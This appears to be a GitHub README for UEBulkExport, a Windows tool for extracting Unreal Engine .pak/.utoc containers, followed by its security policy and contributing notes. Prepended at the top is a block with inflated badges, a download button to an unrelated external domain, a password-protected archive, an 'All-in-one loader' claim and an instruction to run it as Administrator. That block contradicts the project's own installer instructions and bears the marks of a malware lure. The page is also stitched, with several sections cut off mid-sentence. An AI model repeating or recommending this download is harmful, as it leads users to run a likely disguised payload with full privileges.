<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="docs/images/logo-dark.png">
  <img src="docs/images/logo.png" alt="UEBulkExport" width="560">
</picture>

**Browse and export Unreal Engine containers from a desktop interface.**

## What this is

UEBulkExport is a Windows desktop application for inspecting and exporting complete cooked
Unreal Engine containers (`.pak`, `.utoc` and `.ucas`). It can extract cooked packages, convert
supported assets to common formats, dump serialized properties to JSON, or make a byte-exact copy
of container entries. The original directory tree is preserved in the output.

The default **Game packages** result (`legacy` mode) extracts `.uasset`/`.umap` packages together
with their `.uexp`/`.ubulk`/`.uptnl` payloads and does not write JSON. IoStore packages are
converted from Zen to the traditional cooked package layout with
### What it is built on

**Container reading and asset conversion use
## Workflow controls

The Browser can optionally search all subfolders by file name or virtual path. Click the Name,
Type or Size header to change sorting; **Tick this page** and **Tick all matches** are separate
actions. Matching byte totals refer to source metadata, not converted output size.

Export resource presets change only worker count and the raw input budget. In raw mode,
`--max-inflight-mb <MiB>` (default 256, 0 disables) limits concurrent reads using known source
sizes; larger and unknown-size entries run alone. This is not a total RAM limit and more workers
do not guarantee higher throughput. Formats, durable writes and checkpoint compatibility are unchanged.

After a cancelled or unsuccessful export, **Continue previous export** uses the saved request and
file selection, not the current form, with resume enabled. The request lasts for this application
session only. Keep source files and automatically discovered dependencies unchanged; discovery
runs again. A GUI dry run with a Browser selection no longer creates the output or `_selection.txt`.

**Check migration plan** reads source metadata and the `.uproject` descriptor without running
Unreal Editor or external conversion tools, creating working folders or saving target assets.
It reports incomplete payloads, missing tools, Python plugin requirements and cooked-content
limitations. A passed requirements check is not proof that conversion or a particular engine
version works. Actual version migration still needs representative cooked assets and a target editor.

## Output

<p align="center">
  <img src="docs/images/export-pipeline.webp" alt="Export pipeline: reading the container, processing, four kinds of result and the final folder tree" width="920">
</p>

By default, the container's package tree is mirrored. For a package, the output is its cooked
`.uasset` or `.umap` plus any associated `.uexp`, `.ubulk` and `.uptnl`. No `.usmap` is needed.
Legacy `.pak` entries are extracted directly; IoStore packages are converted to legacy cooked
layout by retoc. Neither route recreates uncooked editor data.

With `--mode full`, the tool instead writes converted files:

| Asset | Output |
|---|---|
| any `.uasset` / `.umap` | `.json` with every property of every object; sub-objects under a `<AssetName>/` folder |
| `UTexture2D`, `UTextureCube`, `UTexture2DArray` | `.png` (or `.tga` / `.jpeg` / `.webp`) |
| `UStaticMesh`, `USkeletalMesh` | `.glb` (or ActorX `.psk`/`.pskx`, `.uemodel`, `.usda`) |
| `USkeleton` | `.pskx` — glTF cannot hold a skeleton on its own |
| `UAnimSequence`, `UAnimMontage`, `UAnimComposite` | `.psa` (or `.ueanim`, `.usda`) |
| `USoundWave`, `UAkMediaAssetData` | the original stream (`.binka` / `.ogg` / `.wav`), plus a decoded `.wav` when vgmstream is available |
| `UWorld` (`.umap`) | `.usda` with the full scene graph, plus its referenced meshes |
| materials | `.json`; with `--materials`, a full material export with textures |
| `.ini`, `.png`, `.ttf`, `.svg`, `.locres`, `.mp4`, … | copied verbatim |

---

## Quick start

### 1. Install

UEBulkExport runs on 64-bit Windows 10 version 1607 or later, Windows 11, and Windows Server 2012
or later. The build is self-contained, so no separate .NET installation is needed.

1. Download the latest `UEBulkExport-<version>-win-x64-setup.exe` from
### 2. Run an export

Start **UEBulkExport** from the Start menu and select the game directory (or its `Content\Paks`
directory). The window reads it right away and shows what it found: the number of containers and
entries, the engine version and whether anything is encrypted. Choose what you want to get and
where to save it, then press **Start export**. The contents are listed on the Browser page, and
**Dry run** checks the plan without writing files.

For an automated package extraction, run:

```bat
UEBulkExport.Cli --paks "D:\Games\MyGame" --out "D:\Export"
```

`--paks` accepts the game's root folder, the `Content\Paks` folder, or a single `.utoc` file.
Add `--dry-run` to inspect the plan first. On Windows x64, a verified retoc binary is downloaded
on the first IoStore conversion; use `--retoc` to supply your own. The result contains cooked
### For converted files or JSON: get a `.usmap`

The `full` and `json` modes deserialize properties, and shipping UE5 builds usually store those
properties **unversioned**. Those modes need a mappings file; package extraction does not.

## Migrating assets to another engine version

<p align="center">
  <img src="docs/images/asset-migration.webp" alt="Cooked assets migrated into an organised Unreal project" width="920">
</p>

The **Migrate to UE** page turns a loose cooked game dump into ordinary assets of your own Unreal project. It runs
in two stages:

## Modes

<p align="center">
  <img src="docs/images/export-modes.webp" alt="Four results: game packages, converted files, data for comparison and an exact copy" width="860">
</p>

| Mode | In the window | Mappings | What it does |
|---|---|---|---|
| `legacy` *(default)* | Game packages | not needed | Extracts cooked `.uasset`/`.umap` with payloads; converts IoStore to legacy cooked layout using retoc |
| `full` | Converted files | required | Parses every package and converts it to usable formats |
| `json` | Data for comparison | required | Property dumps only — fast, small, great for diffing two builds |
| `raw` | Exact copy | not needed | Byte-exact dump of every container entry |
| `list` | Browser page | not needed | Prints the container's contents and exits |

> **Editor limitation:** `legacy` converts the *package layout*, not cooked assets back to their
> uncooked originals. Unreal Editor opens only supported cooked types, generally read-only, when
> configured to allow cooked content. `raw` keeps IoStore packages in Zen layout; those are not
> ordinary editor packages.

To try cooked packages in an Unreal project on Windows, use the same engine version that built
the game (including its minor version), preserve the original `Content` path, and add this to the
project's `Config/DefaultEngine.ini`:

```ini
[/Script/UnrealEd.CookerSettings]
cook.AllowCookedDataInEditorBuilds=True
s.AllowUnversionedContentInEditor=1
```

Copy the package and every associated payload into the matching `Content` path. Epic notes that
asset editors and many classes remain unsupported; this does not make the package editable.


**Engine versions newer than retoc knows.** The automatically downloaded retoc 0.1.5 supports
IoStore games through UE5.7. For a newer engine, such as UE5.8, UEBulkExport does not force a
version and lets retoc read it from the containers, but retoc 0.1.5 cannot convert UE5.8 IoStore
packages. The Export page warns about this before the run starts. Choose **Exact copy** (`raw`) or
**Converted files** (`full`) instead, or point **Helper tools** (`--retoc`) at a newer retoc build
once one supports that version.

---

## Options

The desktop interface exposes the normal export workflow. For scripting and advanced automation,
run `UEBulkExport.Cli --help` for the authoritative command-line reference.

### Paths

| Option | Meaning |
|---|---|
| `--paks <path>` | Paks folder, any folder above it, or a single `.utoc` file |
| `--out <dir>` | Destination folder |
| `--usmap <file>` | Mappings file. Auto-detected when exactly one `.usmap` sits next to the executable, in the working directory, or beside the containers |

### Core

| Option | Meaning |
|---|---|
### Filtering

| Option | Meaning |
|---|---|
| `--include <regex>` | Only entries whose container path matches; unavailable for IoStore in `legacy` mode |
| `--exclude <regex>` | Skip entries whose container path matches; unavailable for IoStore in `legacy` mode |
| `--paths-file <file>` | Export only the entries listed in the file, one container path per line. The window writes `_selection.txt` for its tick-box selections, so a GUI export can be repeated from a script |

### What to write

| Option | Meaning |
|---|---|
| `--no-json` | Skip property dumps |
| `--no-assets` | Skip mesh/texture/audio/animation conversion |
| `--no-raw-misc` | Skip loose non-package files |
| `--no-worlds` | Skip `.umap` levels |
| `--no-audio-convert` | Do not produce `.wav` alongside BINKA/ADPCM |
| `--raw-packages` | Also dump the untouched `.uasset`/`.ubulk` bytes |
| `--materials` | Export materials as assets, and let meshes pull in their materials and textures |
| `--overwrite` | Re-export entries already recorded as done |

### Formats

| Option | Values |
|---|---|
| `--mesh` | `gltf2` *(default)*, `actorx`, `ueformat`, `usd` |
| `--anim` | `actorx` *(default)*, `ueformat`, `usd` |
| `--texture` | `png` *(default)*, `tga`, `jpeg`, `webp` |
| `--quality` | `highest` *(default)*, `lowest`, `all` — which mesh LODs to write |
| `--nanite` | `nonanite` *(default)*, `naniteonly`, `nanitefirst`, `nanitelast` |
| `--sockets` | `bone` *(default)*, `socket`, `none` |
| `--all-mips` | Write every texture mip |
| `--no-morphs` | Skip morph targets |
| `--platform` | `DesktopMobile` *(default)*, `XboxAndPlaystation4`, `Playstation5`, `NintendoSwitch` |

### Helper binaries

| Option | Meaning |
|---|---|
| `--oodle <file>` | Oodle library. Auto-detected, else downloaded |
| `--zlib <file>` | zlib-ng library. Same treatment |
| `--vgmstream <file>` | `vgmstream-cli`, used to turn BINKA/ADPCM audio into `.wav` |

### Exit codes

`0` — success. `1` — the run could not start (bad arguments, missing paths) or crashed. `2` — the
run finished with failed entries, or was cancelled.

---

## Recipes

**Game content only, skipping stock engine assets and levels**, in conversion mode:

```bat
UEBulkExport.Cli --paks "D:\Games\MyGame" --out "D:\Export" --mode full --exclude "^Engine/" --no-worlds
```

**Only the textures, as TGA:**

```bat
UEBulkExport.Cli --paks "D:\Games\MyGame" --out "D:\Textures" ^
             --mode full --no-raw-misc --include "/Textures?/" --texture tga
```

**Meshes and skeletons for Blender's PSK/PSA importer:**

```bat
UEBulkExport.Cli --paks "D:\Games\MyGame" --out "D:\Meshes" --mode full --mesh actorx --no-json
```

**Diff two builds** — property dumps only, then compare the folders with any diff tool:

```bat
UEBulkExport.Cli --paks "D:\Games\MyGame-1.0" --out "D:\diff\1.0" --mode json --usmap "1.0.usmap"
UEBulkExport.Cli --paks "D:\Games\MyGame-1.1" --out "D:\diff\1.1" --mode json --usmap "1.1.usmap"
```

**Encrypted containers:**

```bat
UEBulkExport.Cli --paks "D:\Games\MyGame" --out "D:\Export" ^
             --aes 0x0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF
```

---

## Resuming, logs and errors

Every fully processed entry is appended to `_completed.<mode>.txt` in the output folder. Its files
are first created in staging, flushed to disk, and atomically moved to their final paths. A power
loss therefore cannot turn a truncated `.uasset`, `.uexp`, `.ubulk`, or converted file into a
completed result. The next run verifies the journal, file lengths, source containers, and export
settings, keeps finished work, and retries only incomplete entries.

Legacy IoStore conversion runs through retoc in staging after ordinary entries. Cancelling it keeps
the ordinary files that already finished, while the incomplete retoc phase is safely retried by the
next run. One bad ordinary entry is reported without stopping the remaining work. `--overwrite`
starts fresh. Ctrl+C, Cancel, and closing the window stop active work, flush the journal, and only
then finish the run.

Two more files may land in the output folder:

- **`UEBulkExport.log`** — the full run log. Runs into the same folder are appended, each
  starting with a `----- run started … -----` line.
- **`errors.csv`** — one row per entry that could not be converted, with the exception and
  message. The five most common causes are printed at the end of the run.

The summary counts **failed entries** (container entries that produced nothing) separately from
**failed objects** (single objects inside an otherwise exported package).

In `full` mode, the summary also reports a **`no converter`** count. Those are objects CUE4Parse
has no file format for — components, anim notifies, blueprint nodes, actors inside levels. Their
properties are in the `.json` output. Assets that hold no data on disk are skipped
deliberately: `TextureRenderTarget`, `MediaTexture`, `BinkMediaTexture` (filled by the engine at
runtime) and `BlendSpace` (a set of blending rules, not an animation).

---

## How it works

A few details that are not obvious, and cost time to rediscover:

**The `full` mode needs multiple passes.** CUE4Parse's `ExportSession` keys its queue by object path, so
queuing two exporters for the same object silently drops one. The property dump and the asset
conversion therefore run as separate sessions. Animations, standalone skeletons and levels each
need a format glTF cannot provide, so they run as further passes with their own options —
animations and skeletons as ActorX, levels as USD.

**Levels are expensive.** A `.umap` exported as USD drags in a `.usda` copy of every mesh it
references. Expect hundreds of megabytes and tens of thousands of extra files, partly duplicating
what `.glb` already holds. `--no-worlds` if you only want assets.

**Sound has no exporter.** `USoundWave` is the one asset class CUE4Parse does not export, so
UEBulkExport decodes it directly and, when vgmstream is available, converts Bink to `.wav`.

## Dependencies

Nothing is committed to this repository except source code. Everything else is restored, unpacked
## Legal

This tool reads files you already have. It does not circumvent DRM, does not break encryption
(you supply any AES key yourself), and does not redistribute anyone's assets.

What you may do with what comes out is a separate question, governed by the licence of the game
you extracted it from. Exported assets are the property of their owners. Personal study,
modding where the publisher allows it, and working with your own projects are the intended uses.
Redistributing extracted assets generally is not.

UEBulkExport is not affiliated with Epic Games, the CUE4Parse project, or the UE4SS project.
"Unreal" and "Unreal Engine" are trademarks of Epic Games, Inc.

---


---

## Supported versions

Security fixes go into the latest release only. Please reproduce a problem with the newest
`UEBulkExport-<version>-win-x64-setup.exe` from
## Reporting a vulnerability

**Do not open a public issue, discussion or pull request for a vulnerability.** Report it
privately through GitHub instead:

1. Open the repository's **Security** tab and choose **Report a vulnerability**, or go straight
## What happens next

| Step | Target |
|---|---|
| Acknowledgement of your report | within 3 working days |
| First assessment and severity | within 10 working days |
| Fix for a confirmed high or critical issue | within 30 days where possible |

We keep you informed along the way, agree on a disclosure date with you, and publish a GitHub
security advisory together with the fixed release. With your consent you are credited in the
advisory and in the changelog; you can also stay anonymous. A CVE is requested through GitHub
when the issue warrants one.

## Scope

In scope — for example:

- code execution or memory corruption triggered by a crafted `.pak`, `.utoc`, `.ucas`, `.usmap`
  or dump file;
- writing, overwriting or deleting files outside the chosen output folder or the target project
  (path traversal in entry names, links, the migration working copy);
- injection into the commands or the Python script UEBulkExport builds for UE Viewer, retoc or
  the Unreal Editor;
- loading or running a helper binary or library that an attacker could plant or replace;
- AES keys or other secrets exposed in logs, reports, the equivalent command line or
  `%LOCALAPPDATA%\UEBulkExport`;
- privilege problems in the installer or the uninstaller.

Out of scope:

- extracting assets from a game — that is what the tool is for; whether you may use them is a
  licensing question, see the README's legal section;
- vulnerabilities in CUE4Parse, retoc, UE Viewer, UE4SS or Unreal Engine themselves — please
  report those to their authors, and tell us if the way UEBulkExport uses them makes things worse;
- the SmartScreen warning for the unsigned installer;
- problems that require an attacker who already has administrator rights on the machine;
- denial of service by feeding the tool a huge or endless file on your own computer.

## How UEBulkExport handles code from the network

So you know what to look at:

- **retoc** is downloaded from its GitHub release over HTTPS and checked against a pinned SHA-256
  hash, both for the archive and for the executable, before it runs.
- **Native libraries** (zlib-ng, Oodle, Detex and CUE4Parse's native helper) are downloaded over
  HTTPS on first use when they are not already present, and cached in
  `%LOCALAPPDATA%\UEBulkExport\native`. These downloads are not yet pinned to a hash; hardening
  them is planned.
- Nothing else is sent over the network. UEBulkExport has no telemetry and never uploads files.

## Safe harbour

Good-faith research is welcome. Test on your own computer and with your own data, do not access
data that is not yours, do not degrade anyone else's use of the project, and give us a reasonable
chance to fix the issue before disclosure. We will not pursue or support action against research
done in that spirit.

---

# Политика безопасности

UEBulkExport открывает файлы, пришедшие извне: игровые контейнеры, файлы маппингов, дампы и пути,
которые вводит пользователь. Кроме того, программа запускает вспомогательные утилиты, а при
переносе — Unreal Editor. Ошибки в этой обработке могут быть опасны, поэтому мы благодарны за
отчёты и относимся к ним серьёзно.

## Поддерживаемые версии

Исправления безопасности выходят только в последнем релизе. Прежде чем сообщать о проблеме,
проверьте её на свежем `UEBulkExport-<версия>-win-x64-setup.exe` со страницы
## Как сообщить об уязвимости

**Не создавайте публичный issue, обсуждение или pull request об уязвимости.** Отправьте приватный
отчёт через GitHub:

1. Откройте вкладку **Security** репозитория и выберите **Report a vulnerability** или перейдите
## Что будет дальше

| Этап | Срок |
|---|---|
| Подтверждение получения | в течение 3 рабочих дней |
| Первичная оценка и степень опасности | в течение 10 рабочих дней |
| Исправление подтверждённой высокой или критической проблемы | по возможности в течение 30 дней |

Мы держим вас в курсе, согласуем с вами дату раскрытия и публикуем security advisory на GitHub
вместе с исправленным релизом. С вашего согласия вы будете указаны в advisory и в журнале изменений;
можно остаться анонимным. Если проблема этого заслуживает, CVE запрашивается через GitHub.

## Что относится к безопасности

Относится, например:

- выполнение кода или повреждение памяти из-за специально подготовленного `.pak`, `.utoc`, `.ucas`,
  `.usmap` или файла дампа;
- запись, перезапись или удаление файлов за пределами выбранной папки вывода или целевого проекта
  (обход пути в именах записей, ссылки, рабочая копия при переносе);
- внедрение в команды или Python-скрипт, которые UEBulkExport формирует для UE Viewer, retoc или
  Unreal Editor;
- загрузка или запуск вспомогательной программы или библиотеки, которую злоумышленник может
  подложить или подменить;
- AES-ключи или другие секреты в журналах, отчётах, эквивалентной команде или в
  `%LOCALAPPDATA%\UEBulkExport`;
- проблемы с правами у установщика или программы удаления.

Не относится:

- извлечение ассетов из игры — ради этого инструмент и существует; можно ли их использовать —
  вопрос лицензии, см. правовой раздел README;
- уязвимости самих CUE4Parse, retoc, UE Viewer, UE4SS или Unreal Engine — сообщайте о них их авторам
  и расскажите нам, если то, как их использует UEBulkExport, усугубляет проблему;
- предупреждение SmartScreen о неподписанном установщике;
- проблемы, для которых злоумышленнику уже нужны права администратора на компьютере;
- отказ в обслуживании из-за огромного или бесконечного файла на вашем же компьютере.

## Что UEBulkExport получает из сети

Чтобы было понятно, куда смотреть:

- **retoc** скачивается из релиза на GitHub по HTTPS и перед запуском сверяется с закреплённым
  хэшем SHA-256 — и архив, и сам исполняемый файл.
- **Нативные библиотеки** (zlib-ng, Oodle, Detex и нативный модуль CUE4Parse) скачиваются по HTTPS
  при первом использовании, если их ещё нет, и кешируются в `%LOCALAPPDATA%\UEBulkExport\native`.
  Эти загрузки пока не сверяются с закреплённым хэшем; усиление проверки запланировано.
- Больше ничего по сети не передаётся. Телеметрии нет, файлы никуда не отправляются.

## Добросовестное исследование

Мы рады добросовестным исследованиям. Проверяйте на своём компьютере и на своих данных, не
получайте доступ к чужим данным, не мешайте другим пользоваться проектом и дайте нам разумное время
на исправление перед раскрытием. Против исследований, проведённых в таком духе, мы не будем
предпринимать и поддерживать никаких действий.


---

# Contributing

Thanks for looking. This is a small project with a narrow purpose, which keeps things simple.

## Reporting a problem

An export failure is far easier to act on with:

- the exact command you ran (the window shows it in the "Equivalent command line" box);
- the engine version (`--game`, or what the game's `.uproject` says);
- the summary block at the end of the run;
- the relevant rows from `errors.csv`;
- whether the same asset works in FModel with the same `.usmap`.

That last one matters: if FModel fails too, the issue is in CUE4Parse, and the report should go
there.

Please do not attach game assets, `.usmap` files, or containers. They are not yours to
redistribute, and the paths and error messages are enough.

## Building

```bash
dotnet build UEBulkExport.slnx -c Release
dotnet test tests/UEBulkExport.Tests -c Release
```

Requires the .NET 10 SDK. The first build downloads a NuGet package to extract
`CUE4Parse-Natives` from; after that it works offline. The tests need neither network access nor
game files.

The solution has three source projects and one test project:

- `src/UEBulkExport.Core` — the library with all export logic. Anything that is not presentation
  belongs here, so both front ends behave the same.
- `src/UEBulkExport.Cli` — the console front end, `UEBulkExport.Cli.exe`.
- `src/UEBulkExport` — the desktop window, `UEBulkExport.exe`.
- `tests/UEBulkExport.Tests` — xunit tests for the core.

To produce the release layout, publish both executables into one folder:

```bash
dotnet publish src/UEBulkExport     -c Release -r win-x64 --self-contained -o artifacts/publish
dotnet publish src/UEBulkExport.Cli -c Release -r win-x64 --self-contained -o artifacts/publish
```

### Release packaging

Windows releases must be distributed as
`UEBulkExport-<version>-win-x64-setup.exe`, built from `installer/UEBulkExport.iss`; do not replace
the installer with a ZIP archive. Publish the GUI and CLI into the same staging directory before
compiling the installer so they continue to share Core, the self-contained .NET runtime and native
libraries. The default Full installation must include every export dependency and let the user
choose the destination directory. Whenever installation or release behaviour changes, update
`README.md` and `README.ru.md` together.

The installer is built by one script everywhere: on your machine, in CI and for a release.
`installer/build.ps1` publishes both executables into one staging folder, adds the offline
documentation, generates the wizard artwork, optionally signs, compiles `installer/UEBulkExport.iss`
and writes `SHA256SUMS.txt`. It needs Inno Setup 6.6 or later; `installer/install-inno.ps1`
downloads the pinned 6.7.3, checks its SHA-256 and installs it portably:

```powershell
./installer/install-inno.ps1 -Destination "$env:TEMP\inno-setup"   # once; prints the ISCC.exe path
./installer/build.ps1 -Iscc "$env:TEMP\inno-setup\ISCC.exe"          # -> artifacts/installer
./installer/smoke-test.ps1 -Installer artifacts/installer/UEBulkExport-2.1.0-win-x64-setup.exe
```

The version comes from `Directory.Build.props` unless `-Version` is given. The smoke test installs
the setup silently for the current user into a temporary folder, checks the payload, runs the
installed CLI with `--version` and uninstalls it again. The CI workflow runs all three on every push
and pull request and keeps the result as a build artifact for 14 days, so a change that breaks the
installer shows up long before a release is tagged.

The artwork sources live in `installer/branding`: `icon-source.webp` for the application icon and
`design/*.webp` for the wizard and the README logo. The generated `wizard-*.png` files are not
committed; `app.ico`, `logo.png` and `docs/images/logo*.png` are. After replacing a source image,
run the generator (`dotnet run --project installer/branding/generator -- installer/branding
src/UEBulkExport/Assets docs/images`) and commit the regenerated icon and logo files. The README describes installing from
`setup.exe` only; build instructions for the installer belong here.

How the installer behaves, so changes keep it that way:

- **`AppId` never changes.** Setup finds an existing installation by it and switches to update
  mode (the licence, folder, components and shortcuts are reused), reinstall mode (same version;
  components can be changed) or asks before a downgrade (`/ALLOWDOWNGRADE` for unattended runs).
- **Install mode.** All users by default; *only for me* is offered by a dialog or `/CURRENTUSER`.
  An update keeps the mode of the existing installation, so there is never a second copy.
- **Obsolete files.** At compile time ISPP lists every file in `SourceDir`; an update deletes
  `.dll`/`.exe`/`.json`/`.pdb` files in the application folder that are not on that list.
  Deselected components are removed through `[InstallDelete]`. Native components appear only when
  their libraries are in `SourceDir`, so a checkbox never installs nothing.
- **Running application.** `UEBulkExport.exe` and `UEBulkExport.Cli.exe` create the
  `UEBulkExport.Running` mutex (`RunningMarker.cs`); the installer's `AppMutex` must use the same
  name.
- **Language.** Setup writes `installer.json` with the wizard language next to the executable; the
  application uses it until the user picks a language in Settings.

To try the installer without touching a real installation, build it with its own identity
(`UEBulkExport Test`, a separate `AppId`) and install it for the current user into a scratch folder.
Run the smoke test only against such a build on a machine where UEBulkExport is really installed:

```powershell
./installer/build.ps1 -Version 2.0.9 -TestIdentity -Output artifacts/test
artifacts\test\UEBulkExport-2.0.9-win-x64-setup.exe /CURRENTUSER /DIR="$env:TEMP\uebe-test"
```

Then build a higher `-Version` the same way (add `-SkipPublish` to reuse the staging folder) to see
the update flow, and a lower one for the downgrade question.

**Code signing** is optional. Add the repository secrets `WINDOWS_SIGNING_CERTIFICATE` (the
`.pfx` file, base64-encoded) and `WINDOWS_SIGNING_PASSWORD`; the release workflow then signs both
executables, the installer and its uninstaller, and timestamps them. Every release also carries
`SHA256SUMS.txt`. Locally, pass the same kind of command to `build.ps1 -SignCommand`, written in
Inno Setup's sign tool syntax (`$q` is a double quote, `$f` the file to sign), for example
`'$qC:\Kits\signtool.exe$q sign /fd sha256 /f $qcert.pfx$q /p password $f'`. Inno Setup refuses a
command that returns success without actually signing, so a broken certificate cannot slip
through as an unsigned release.

### GUI code

The window lives under `src/UEBulkExport` and is built with Avalonia, MVVM style, using
CommunityToolkit.Mvvm for observable properties and commands. User-visible strings go into
`Localization/Strings.en.json` and `Localization/Strings.ru.json` with the same keys in both
files — never hard-coded in XAML or view models. Never copy code, XAML, icons or text from FModel:
it is GPL-3.0 and this project is Apache-2.0.

## Code style

`.editorconfig` covers the mechanics. Beyond it:

- The build is warning-free. CI runs with `-warnaserror`, so keep it that way.
- Comment the *why*, not the *what*. The tricky parts of this codebase are all
  "why is it done in this roundabout way", and the answer is usually a CUE4Parse behaviour worth
  writing down — see the three-pass export in `BulkExporter` for the pattern.
- Errors a user can fix are `UserFacingException`, with a headline and a hint. Everything else is
  a bug and should keep its stack trace.
- No new third-party binaries in the repository. Fetch, unpack or locate them at build or run
  time, and record them in `THIRD-PARTY-NOTICES.md`.


---

                                 Apache License
                           Version 2.0, January 2004
